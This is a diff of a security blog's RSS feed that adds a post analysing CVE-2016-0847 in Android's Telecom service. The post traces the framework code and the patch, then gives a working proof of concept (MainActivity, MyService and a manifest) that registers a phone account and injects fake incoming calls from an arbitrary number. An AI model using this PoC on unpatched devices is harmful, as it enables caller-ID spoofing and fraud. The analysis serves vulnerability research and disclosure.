@@ -9,8 +9,362 @@
     <managingEditor>zeqiii@163.com (zeqi)</managingEditor>
     <webMaster>zeqiii@163.com (zeqi)</webMaster>
     <copyright>(c) 2016 zeqi</copyright>
-    <lastBuildDate>Tue, 15 Mar 2016 10:28:28 +0800</lastBuildDate>
+    <lastBuildDate>Fri, 08 Apr 2016 15:55:52 +0800</lastBuildDate>
     <atom:link href="https://zeqiii.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Analysis of cve-2016-0847</title>
+      <link>https://zeqiii.github.io/2016/04/08/analysis-of-cve-2016-0847/</link>
+      <pubDate>Fri, 08 Apr 2016 15:55:52 +0800</pubDate>
+      <author>zeqiii@163.com (zeqi)</author>
+      <guid>https://zeqiii.github.io/2016/04/08/analysis-of-cve-2016-0847/</guid>
+      <description>
+
+&lt;h2 id=&#34;introduction:3e2c06bc67180e971c44700697f99ccd&#34;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;In &lt;a href=&#34;https://source.android.com/security/bulletin/2016-04-02.html&#34;&gt;Nexus Security Bulletin-April 2016&lt;/a&gt;, cve-2016-0847 is disclosed. Let&amp;rsquo;s analysis!&lt;/p&gt;
+
+&lt;h2 id=&#34;overview-of-telecom:3e2c06bc67180e971c44700697f99ccd&#34;&gt;Overview of Telecom&lt;/h2&gt;
+
+&lt;p&gt;When a phone call arrives, android framework will send a notification to &lt;code&gt;Telephony&lt;/code&gt;. The latter will call function addNewIncomingCall() like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;TelecomManager.from(context).addNewIncomingCall(phoneAccount, extras);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This somehow equals:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;TelecomManager telecomManager = (TelecomManager) context.getSystemService(context.TELECOM_SERVICE);
+    telecomManager.addNewIncomingCall(phoneAccount, extras);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;TelecomManager&lt;/code&gt; can be get by &lt;code&gt;context.getSystemService(context.TELECOM_SERVICE)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now we should find where telecom service is registered.&lt;/p&gt;
+
+&lt;p&gt;Android has a system service named &lt;code&gt;TelecomLoaderService&lt;/code&gt; whose function &lt;code&gt;onBootPhase&lt;/code&gt; is:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override
+public void onBootPhase(int phase) {
+    if (phase == PHASE_ACTIVITY_MANAGER_READY) {
+        registerDefaultAppNotifier();
+        registerCarrierConfigChangedReceiver();
+        connectToTelecom();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;onBootPhase()&lt;/code&gt; is called during booting, it calls another function &lt;code&gt;connectToTelecom()&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private static final ComponentName SERVICE_COMPONENT = new ComponentName(
+            &amp;quot;com.android.server.telecom&amp;quot;,
+            &amp;quot;com.android.server.telecom.components.TelecomService&amp;quot;);
+
+private void connectToTelecom() {
+    synchronized (mLock) {
+        if (mServiceConnection != null) {
+            // TODO: Is unbinding worth doing or wait for system to rebind?
+            mContext.unbindService(mServiceConnection);
+            mServiceConnection = null;
+        }
+
+        TelecomServiceConnection serviceConnection = new TelecomServiceConnect();
+        Intent intent = new Intent(SERVICE_ACTION);
+        intent.setComponent(SERVICE_COMPONENT);
+        int flags = Context.BIND_IMPORTANT | Context.BIND_FOREGROUND_SERVICE
+                | Context.BIND_AUTO_CREATE;
+
+        // Bind to Telecom and register the service
+        if (mContext.bindServiceAsUser(intent, serviceConnection, flags, UserHandle.OWNER)) {
+            mServiceConnection = serviceConnection;
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Function &lt;code&gt;connectToTelecom&lt;/code&gt; binds a serivce named &lt;code&gt;com.android.server.telecom.components.TelecomService&lt;/code&gt;, the ServiceConnection is &lt;code&gt;TelecomServiceConnection&lt;/code&gt; whose &lt;code&gt;onServiceConnected()&lt;/code&gt; is implemented as:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private class TelecomServiceConnection implements ServiceConnection {
+    @Override
+    public void onServiceConnected(ComponentName name, IBinder service) {
+        // Normally, we would listen for death here, but since telecom runs in the same process
+        // as this loader (process=&amp;quot;system&amp;quot;) thats redundant here.
+        try {
+            service.linkToDeath(new IBinder.DeathRecipient() {
+                @Override
+                public void binderDied() {
+                    connectToTelecom();
+                }
+            }, 0);
+            SmsApplication.getDefaultMmsApplication(mContext, false);
+            ServiceManager.addService(Context.TELECOM_SERVICE, service);
+    ...
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, when the phone is booting, &lt;code&gt;TelecomLoaderService.onBootPhase()&lt;/code&gt; is invoked, it calls function &lt;code&gt;connectToTelecom()&lt;/code&gt;. This function binds the service &lt;code&gt;com.android.server.telecom.components.TelecomService&lt;/code&gt;. &lt;code&gt;TelecomService.onBind()&lt;/code&gt; will return a &lt;code&gt;IBinder&lt;/code&gt; object which is the second parameter of &lt;code&gt;onServiceConnected(ComponentName name, IBinder service)&lt;/code&gt;. Function &lt;code&gt;onServiceConnected()&lt;/code&gt; registers this binder into &lt;code&gt;ServiceManager&lt;/code&gt; as the &lt;code&gt;TELECOM_SERVICE&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Here is the &lt;code&gt;onBind()&lt;/code&gt; of &lt;code&gt;TelecomService&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public IBinder onBind(Intent intent) {
+    Log.d(this, &amp;quot;onBind&amp;quot;);
+    initializeTelecomSystem(this);
+    synchronized (getTelecomSystem().getLock()) {
+        return getTelecomSystem().getTelecomServiceImpl().getBinder();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;getTelecomSystem().getTelecomServiceImpl()&lt;/code&gt; returns an object of TelecomServiceImpl. The &lt;code&gt;getBinder()&lt;/code&gt; in TelecomServiceImpl is like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public ITelecomService.Stub getBinder() {
+    return mBinderImpl;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;mBinderImpl&lt;/code&gt; is a field of TelecomServiceImpl:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private final ITelecomService.Stub mBinderImpl = new ITelecomService.Stub() {
+	...
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;mBinderImpl&lt;/code&gt; implements the interfaces defined in &lt;code&gt;ITelecomService.aidl&lt;/code&gt;, including &lt;code&gt;addNewIncomingCall()&lt;/code&gt; and &lt;code&gt;addNewUnknownCall()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;start-from-the-patch:3e2c06bc67180e971c44700697f99ccd&#34;&gt;Start from the Patch&lt;/h2&gt;
+
+&lt;p&gt;From the &lt;a href=&#34;https://android.googlesource.com/platform/packages/services/Telecomm/+/2750faaa1ec819eed9acffea7bd3daf867fda444%5E%21/#F0&#34;&gt;patch&lt;/a&gt; we can see the fix is in &lt;code&gt;TelecomServiceImple.java&lt;/code&gt;:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Add a new function &lt;code&gt;enforcePhoneAccountIsRegisteredEnabled&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;After every &lt;code&gt;enforceUserHandleMatchesCaller(phoneAccountHandle)&lt;/code&gt;, add the newly added function.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;+    // Enforce that the PhoneAccountHandle being passed in is both registered to the current user
++    // and enabled.
++    private void enforcePhoneAccountIsRegisteredEnabled(PhoneAccountHandle phoneAccountHandle) {
++        PhoneAccount phoneAccount = mPhoneAccountRegistrar.getPhoneAccountCheckCallingUser(
++                phoneAccountHandle);
++        if (phoneAccount == null) {
++            EventLog.writeEvent(0x534e4554, &amp;quot;26864502&amp;quot;, Binder.getCallingUid(), &amp;quot;R&amp;quot;);
++            throw new SecurityException(&amp;quot;This PhoneAccountHandle is not registered for this user!&amp;quot;);
++        }
++        if (!phoneAccount.isEnabled()) {
++            EventLog.writeEvent(0x534e4554, &amp;quot;26864502&amp;quot;, Binder.getCallingUid(), &amp;quot;E&amp;quot;);
++            throw new SecurityException(&amp;quot;This PhoneAccountHandle is not enabled for this user!&amp;quot;);
++        }
++    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s see &lt;code&gt;getPhoneAccountCheckCallingUser()&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public PhoneAccount getPhoneAccountCheckCallingUser(PhoneAccountHandle handle) {
+    PhoneAccount account = getPhoneAccount(handle);
+    if (account != null &amp;amp;&amp;amp; isVisibleForUser(account)) {
+        return account;
+    }
+    return null;
+}
+PhoneAccount getPhoneAccount(PhoneAccountHandle handle) {
+    for (PhoneAccount m : mState.accounts) {
+        if (Objects.equals(handle, m.getAccountHandle())) {
+            return m;
+        }
+    }
+    return null;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;By invoking &lt;code&gt;TelecomManager.registerPhoneAccount()&lt;/code&gt;, one can register a &lt;code&gt;PhoneAccount&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;In &lt;code&gt;TelecomServiceImpl.java&lt;/code&gt;, there are two fucntions in which  &lt;code&gt;enforceUserHandleMatchesCaller(phoneAccountHandle)&lt;/code&gt; is called. (&lt;font color=&#34;red&#34;&gt; note: All the code below are not patched &lt;/font&gt;)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt; @Override
+public void addNewIncomingCall(PhoneAccountHandle phoneAccountHandle, Bundle extras) {
+    synchronized (mLock) {
+        if (phoneAccountHandle != null &amp;amp;&amp;amp; phoneAccountHandle.getComponentName() != null) {
+           // TODO(sail): Add unit tests for adding incoming calls from a SIM call manager.
+            if (isCallerSimCallManager() &amp;amp;&amp;amp; TelephonyUtil.isPstnComponentName(
+                    phoneAccountHandle.getComponentName())) {
+                Log.v(this, &amp;quot;Allowing call manager to add incoming call with PSTN handle&amp;quot;);
+            } else {
+                mAppOpsManager.checkPackage(
+                        Binder.getCallingUid(),
+                        phoneAccountHandle.getComponentName().getPackageName());
+                // Make sure it doesn&#39;t cross the UserHandle boundary
+                enforceUserHandleMatchesCaller(phoneAccountHandle);
+            }
+
+            long token = Binder.clearCallingIdentity();
+            try {
+                Intent intent = new Intent(TelecomManager.ACTION_INCOMING_CALL);
+                intent.putExtra(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
+                    phoneAccountHandle);
+                intent.putExtra(CallIntentProcessor.KEY_IS_INCOMING_CALL, true);
+                if (extras != null) {
+                    intent.putExtra(TelecomManager.EXTRA_INCOMING_CALL_EXTRAS, extras);
+                }
+                CallIntentProcessor.processIncomingCallIntent(mCallsManager, intent);
+            } finally {
+                Binder.restoreCallingIdentity(token);
+            }
+        } else {
+            Log.w(this, &amp;quot;Null phoneAccountHandle. Ignoring request to add new incoming call&amp;quot;);
+        }
+    }
+}
+
+
+@Override
+public void addNewUnknownCall(PhoneAccountHandle phoneAccountHandle, Bundle extras) {
+    synchronized (mLock) {
+        if (phoneAccountHandle != null &amp;amp;&amp;amp; phoneAccountHandle.getComponentName() != null) {
+            mAppOpsManager.checkPackage(
+                    Binder.getCallingUid(),
+                    phoneAccountHandle.getComponentName().getPackageName());
+
+            // Make sure it doesn&#39;t cross the UserHandle boundary
+            enforceUserHandleMatchesCaller(phoneAccountHandle);
+            long token = Binder.clearCallingIdentity();
+
+            try {
+                Intent intent = new Intent(TelecomManager.ACTION_NEW_UNKNOWN_CALL);
+                intent.putExtras(extras);
+                intent.putExtra(CallIntentProcessor.KEY_IS_UNKNOWN_CALL, true);
+                intent.putExtra(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
+                    phoneAccountHandle);
+                CallIntentProcessor.processUnknownCallIntent(mCallsManager, intent);
+            } finally {
+                Binder.restoreCallingIdentity(token);
+            }
+        } else {
+            Log.i(this,&amp;quot;Null phoneAccountHandle or not initiated by Telephony. &amp;quot; +
+                            &amp;quot;Ignoring request to add new unknown call.&amp;quot;);
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;By calling these functions, the attacker can leverage the vulnerability to make calls appear to come from any arbitrary number.&lt;/p&gt;
+
+&lt;h2 id=&#34;phoneaccounthandle:3e2c06bc67180e971c44700697f99ccd&#34;&gt;PhoneAccountHandle&lt;/h2&gt;
+
+&lt;p&gt;Then, let&amp;rsquo;s see what is &lt;code&gt;PhoneAccountHandle&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://developer.android.com/reference/android/telecom/PhoneAccountHandle.html&#34;&gt;android.telecom.PhoneAccountHandle&lt;/a&gt; is the unique identifier for a &lt;a href=&#34;https://developer.android.com/reference/android/telecom/PhoneAccount.html&#34;&gt;PhoneAccount&lt;/a&gt;, which represents a distinct method to place or receive a phone call. &lt;a href=&#34;https://developer.android.com/reference/android/telecom/TelecomManager.html&#34;&gt;TelecomManager&lt;/a&gt; uses registered PhoneAccounts to present the user with alternative options when placing a phone call. When building a PhoneAccount, the app should supply a valid PhoneAccountHandle that references the connection service implementation Telecom will use to interact with the app.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final class PhoneAccountHandle implements Parcelable {
+    private final ComponentName mComponentName;
+    private final String mId;
+    private final UserHandle mUserHandle;
+
+    public PhoneAccountHandle(
+            ComponentName componentName,
+            String id) {
+        this(componentName, id, Process.myUserHandle());
+    }
+
+    public PhoneAccountHandle(
+            ComponentName componentName,
+            String id,
+            UserHandle userHandle) {
+        mComponentName = componentName;
+        mId = id;
+        mUserHandle = userHandle;
+    }
+
+    ...
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;poc:3e2c06bc67180e971c44700697f99ccd&#34;&gt;POC&lt;/h2&gt;
+
+&lt;p&gt;AOSP provide us an example how to &amp;laquo;make a phone call&amp;raquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void sendIncomingCallIntent(Context context, Uri handle, boolean isVideoCall) {
+    PhoneAccountHandle phoneAccount = new PhoneAccountHandle(
+            new ComponentName(context, TestConnectionService.class),
+            CallServiceNotifier.SIM_SUBSCRIPTION_ID);
+    Bundle extras = new Bundle();
+    extras.putBoolean(TestConnectionService.EXTRA_IS_VIDEO_CALL, isVideoCall);
+    if (handle != null) {
+        extras.putParcelable(TestConnectionService.EXTRA_HANDLE, handle);
+    }
+    TelecomManager.from(context).addNewIncomingCall(phoneAccount, extras);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Below is our POC:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;MainActivity.java&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public void sendIncomingCallIntent(Context context, Uri handle, boolean isVideoCall) {
+    PhoneAccountHandle phoneAccount = new PhoneAccountHandle(
+                new ComponentName(this.getApplicationContext(), MyService.class),
+                &amp;quot;test&amp;quot;);
+
+    TelecomManager telecomManager = (TelecomManager) context.getSystemService(context.TELECOM_SERVICE);
+
+    // register phone account
+    PhoneAccount account = PhoneAccount.builder(phoneAccount, &amp;quot;test&amp;quot;).build();
+    telecomManager.registerPhoneAccount(account);
+
+    PhoneAccountHandle thehandle = account.getAccountHandle();
+
+    Bundle extras = new Bundle();
+    extras.putBoolean(&amp;quot;extra_is_video_call&amp;quot;, isVideoCall);
+    Uri uri = Uri.fromParts(PhoneAccount.SCHEME_TEL, &amp;quot;1234567&amp;quot;, null);
+    extras.putParcelable(TelecomManager.EXTRA_INCOMING_CALL_ADDRESS, uri);
+    if (handle != null) {
+        extras.putParcelable(&amp;quot;extra_handle&amp;quot;, handle);
+    }
+    telecomManager.addNewIncomingCall(thehandle, extras);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;MyService.java&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public Connection onCreateIncomingConnection(PhoneAccountHandle connectionManagerPhoneAccount, ConnectionRequest request) {
+    Log.e(TAG, &amp;quot;onCreateIncomingConnection&amp;quot;);
+    Connection connection = createConnectionFor();
+    return connection;
+}
+
+private Connection createConnectionFor() {
+    Connection returnConnection = new Connection() {
+
+    };
+    return returnConnection;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;AndroidManifest.xml&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;service
+    android:name=&amp;quot;.MyService&amp;quot;
+    android:enabled=&amp;quot;true&amp;quot;
+    android:exported=&amp;quot;true&amp;quot;
+    android:permission=&amp;quot;android.permission.BIND_TELECOM_CONNECTION_SERVICE&amp;quot;&amp;gt;
+    &amp;lt;intent-filter&amp;gt;
+        &amp;lt;action android:name=&amp;quot;android.telecom.ConnectionService&amp;quot; /&amp;gt;
+    &amp;lt;/intent-filter&amp;gt;
+&amp;lt;/service&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;source-code-path:3e2c06bc67180e971c44700697f99ccd&#34;&gt;Source Code Path&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;TelecomService: packages/services/Telecomm/src/com/android/server/telecom/components/TelecomService.java&lt;/li&gt;
+&lt;li&gt;TelecomLoaderService: frameworks/base/services/core/java/com/android/server/telecom/TelecomLoaderService.java&lt;/li&gt;
+&lt;li&gt;TelecomServiceImpl: packages/services/Telecomm/src/com/android/server/telecom/TelecomServiceImpl.java&lt;/li&gt;
+&lt;li&gt;TelecomSystem: packages/services/Telecomm/src/com/android/server/telecom/TelecomSystem.java&lt;/li&gt;
+&lt;li&gt;ITelecomService.aidl: frameworks/base/services/core/java/com/android/internal/telecom/ITelecomService.aidl&lt;/li&gt;
+&lt;li&gt;PhoneAccountHandle: frameworks/base/Telecomm/Java/Android/Telecom/PhoneAccountHandle.java&lt;/li&gt;
+&lt;li&gt;PhoneAccountRegistrar: packages/services/Telecomm/src/com/android/server/telecom/PhoneAccountRegistrar.java&lt;/li&gt;
+&lt;li&gt;PhoneAccount: frameworks/base/Telecomm/Java/Android/Telecom/PhoneAccount.java&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     
     <item>
       <title>Analysis of Java Serialization</title>
@@ -20,7 +374,7 @@
       <guid>https://zeqiii.github.io/2016/03/15/analysis-of-java-serialization/</guid>
       <description>
 
-&lt;h3 id=&#34;demo:68a7f84eae0d34438ed8064af9699a4b&#34;&gt;Demo&lt;/h3&gt;
+&lt;h3 id=&#34;demo&#34;&gt;Demo&lt;/h3&gt;
 
 &lt;p&gt;Class &lt;code&gt;MySerial&lt;/code&gt; contains these fields and methods.&lt;/p&gt;
 
@@ -53,7 +407,7 @@
 	}
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;debugging-objectinputstream-readobject:68a7f84eae0d34438ed8064af9699a4b&#34;&gt;Debugging ObjectInputStream.readObject()&lt;/h3&gt;
+&lt;h3 id=&#34;debugging-objectinputstream-readobject&#34;&gt;Debugging ObjectInputStream.readObject()&lt;/h3&gt;
 
 &lt;p&gt;The constructor of &lt;code&gt;ObjectInputStream&lt;/code&gt;.&lt;/p&gt;
 
@@ -596,7 +950,7 @@ void initNonProxy(ObjectStreamClass model,
 
 &lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/readObject.png&#34; alt=&#34;read object&#34; /&gt;&lt;/p&gt;
 
-&lt;h3 id=&#34;thinking-with-cve-2014-7911:68a7f84eae0d34438ed8064af9699a4b&#34;&gt;Thinking with CVE-2014-7911&lt;/h3&gt;
+&lt;h3 id=&#34;thinking-with-cve-2014-7911&#34;&gt;Thinking with CVE-2014-7911&lt;/h3&gt;
 
 &lt;p&gt;To leverage this vulnerability, one of the steps is to change &lt;code&gt;AAdroid&lt;/code&gt; to &lt;code&gt;android&lt;/code&gt; in the serialized data, so that &lt;code&gt;readObject()&lt;/code&gt; create a new &lt;code&gt;android.os.BinderProxy&lt;/code&gt; object with the fields &lt;code&gt;mArgs&lt;/code&gt; and &lt;code&gt;mOrgs&lt;/code&gt; being set as the value of the fake &lt;code&gt;AAdroid.os.BinderProxy&lt;/code&gt; object.&lt;/p&gt;
 
@@ -612,7 +966,7 @@ void initNonProxy(ObjectStreamClass model,
       <guid>https://zeqiii.github.io/2016/03/10/methods-of-debugging-java-programs/</guid>
       <description>
 
-&lt;h2 id=&#34;debug-java-source-code-in-eclipse:71104563d2f4707e3c3b17590a7ace2b&#34;&gt;Debug Java Source Code In Eclipse&lt;/h2&gt;
+&lt;h2 id=&#34;debug-java-source-code-in-eclipse&#34;&gt;Debug Java Source Code In Eclipse&lt;/h2&gt;
 
 &lt;p&gt;Sometimes we want to know how a Java API works. It is a good idea to write a testing program, debug it and step into the API function to see how it works.&lt;/p&gt;
 
@@ -650,7 +1004,7 @@ void initNonProxy(ObjectStreamClass model,
 
 &lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/methods_of_debugging_java_programs/debug.png&#34; alt=&#34;debug&#34; /&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;debug-with-jdi:71104563d2f4707e3c3b17590a7ace2b&#34;&gt;Debug with JDI&lt;/h2&gt;
+&lt;h2 id=&#34;debug-with-jdi&#34;&gt;Debug with JDI&lt;/h2&gt;
 
 &lt;p&gt;Referring to &lt;a href=&#34;http://illegalargumentexception.blogspot.com/2009/03/java-using-jpda-to-write-debugger.html&#34;&gt;llegalargumentexception.blogspot.com&lt;/a&gt;, using Java code to connect to the VM can help us debug a Java program.&lt;/p&gt;
 
@@ -740,9 +1094,9 @@ void initNonProxy(ObjectStreamClass model,
       <guid>https://zeqiii.github.io/2016/03/08/c/c-programming-knowledge/</guid>
       <description>
 
-&lt;h2 id=&#34;functions-reserved-words-and-macros&#34;&gt;Functions, Reserved Words and Macros&lt;/h2&gt;
+&lt;h2 id=&#34;functions-reserved-words-and-macros:f4d4f217ac0e8a971a18d7aee1dbb609&#34;&gt;Functions, Reserved Words and Macros&lt;/h2&gt;
 
-&lt;h3 id=&#34;reinterpret-cast-new-type-expression&#34;&gt;reinterpret_cast &lt;new_type&gt; (expression)&lt;/h3&gt;
+&lt;h3 id=&#34;reinterpret-cast-new-type-expression:f4d4f217ac0e8a971a18d7aee1dbb609&#34;&gt;reinterpret_cast &lt;new_type&gt; (expression)&lt;/h3&gt;
 
 &lt;p&gt;Cast the &lt;code&gt;expression&lt;/code&gt; to a &lt;code&gt;new_type&lt;/code&gt;.&lt;/p&gt;
 
@@ -757,7 +1111,7 @@ funcP(value);
 
 &lt;p&gt;Of course, this program will crash after being executed.&lt;/p&gt;
 
-&lt;h3 id=&#34;macro-with-variable-argument-list&#34;&gt;Macro with variable argument list&lt;/h3&gt;
+&lt;h3 id=&#34;macro-with-variable-argument-list:f4d4f217ac0e8a971a18d7aee1dbb609&#34;&gt;Macro with variable argument list&lt;/h3&gt;
 
 &lt;p&gt;For example:&lt;/p&gt;
 
